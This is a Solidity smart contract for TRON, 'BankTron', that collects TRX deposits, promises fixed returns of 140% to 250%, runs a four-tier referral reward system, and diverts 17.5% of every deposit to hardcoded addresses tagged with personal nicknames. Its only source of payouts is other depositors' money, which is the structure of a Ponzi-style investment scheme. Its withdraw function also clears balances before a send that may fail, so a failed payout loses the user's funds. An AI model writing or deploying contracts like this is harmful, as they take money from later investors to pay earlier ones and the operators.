//SourceUnit: bankTron.sol

pragma solidity >=0.4.22 <0.6.0;

contract BankTron {
  struct Tariff {
    uint time;
    uint percent;
  }

  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;	
    uint withdrawn;
  }

  uint MIN_DEPOSIT = 500 trx;
  uint START_AT = 60;

  address payable public          foundation_fee;
  address payable public          platform_fee;
  address payable public          insurance_fee;
  address payable public          sponsor_fee;

  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;

  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);

  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;

      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;

        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }

          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }

          rec = investors[rec].referer;
        }
      }
    }
  }

  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;

    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }

      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;

      rec = investors[rec].referer;
    }
  }

  constructor() public {
    tariffs.push(Tariff(4 * 28800, 140));
    tariffs.push(Tariff(6 * 28800, 192));
    tariffs.push(Tariff(8 * 28800, 224));
    tariffs.push(Tariff(10 * 28800, 250));

    foundation_fee = address(0x41A406ECFDEA2CD5D32D2FA297E5EB4289D78463D8); // anhnt
    platform_fee   = address(0x4142F89EFE926174AB6BBF3D3D3CE36BF354BB2084); // tony
    insurance_fee  = address(0x41A2B519C05EA08548F10D75E01BE6F66FC8E05294); // insurance fee
    sponsor_fee    = address(0x4142F89EFE926174AB6BBF3D3D3CE36BF354BB2084); // sponsor fee


    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
  }

  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);

    register(referer);

    platform_fee.transfer(msg.value  * 5 / 100);  // 5%
    foundation_fee.transfer(msg.value  * 5 / 100); // 5%
    sponsor_fee.transfer(msg.value  * 5 / 100); // 5%
    insurance_fee.transfer(msg.value  * 25 / 1000); // 2.5%

    rewardReferers(msg.value, investors[msg.sender].referer);

    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;

    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));

    emit DepositAt(msg.sender, tariff, msg.value);
  }

  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];

      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];

    uint amount = withdrawable(msg.sender);

    amount += investor.balanceRef;
    investor.balanceRef = 0;

    investor.paidAt = block.number;

    return amount;
  }

  function withdraw() external {
    uint amount = profit();
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;

      emit Withdraw(msg.sender, amount);
    }
  }

  function via(address payable where) external payable {
    where.transfer(msg.value);
  }
}